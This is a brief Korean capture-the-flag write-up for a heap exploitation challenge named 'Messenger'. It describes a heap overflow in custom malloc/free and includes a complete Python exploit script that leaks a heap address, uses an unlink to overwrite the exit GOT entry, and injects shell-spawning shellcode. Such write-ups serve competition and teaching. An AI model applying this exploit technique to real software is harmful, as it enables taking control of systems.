Messenger (pwn)
=============

### 1. Introduction

예선이라 그런지 본선이랑 문제 퀄리티가 다르다. 금방 풀었다.

### 2. Vulnerability

Custom Malloc 이랑 Custom Free를 쓰면서 Heap Overflow를 줬다. 그러니 그냥 unlink로 풀었다. (NX도 풀려있음)

### 3. Exploit
```python
from ntpwn import *

# local
s = process('./messenger')
b = BP(s)
b.bp('c')
b.done()

e = ELF('./messenger')
context.arch = 'amd64'

def leave(size,msg):
	s.sendlineafter('>> ','L')
	s.sendlineafter('size : ',size)
	s.sendafter('msg : ',msg)

def remove(idx):
	s.sendlineafter('>> ','R')
	s.sendlineafter('index : ',idx)

def change(idx,size,msg):
	s.sendlineafter('>> ','C')
	s.sendlineafter('index : ',idx)
	s.sendlineafter('size : ',size)
	s.sendafter('msg : ',msg)

def view(idx):
	s.sendlineafter('>> ','V')
	s.sendlineafter('index : ',idx)

# size <= 32
leave('32','A' * 32)
leave('32','A' * 32)

change('0','100', 'B' * 0x30 + 'A' * 0x8 )
view('0')
s.recvuntil('A' * 0x8)
heap = u32(s.recvline()[:-1].ljust(4,'\x00'))
log.info("HEAP : " + hex(heap))

payload = 'B' * 0x28
payload += 'A' * 0x8
payload += p64(0x49) + p64(e.got['exit'] - 0x10) + p64(heap - 0x30)
change('0','100', payload )
remove('1')

change('0','200', 'B' * 0x48 + asm(shellcraft.sh()))
s.sendlineafter('>> ','NEXTLINE')

s.interactive()
```
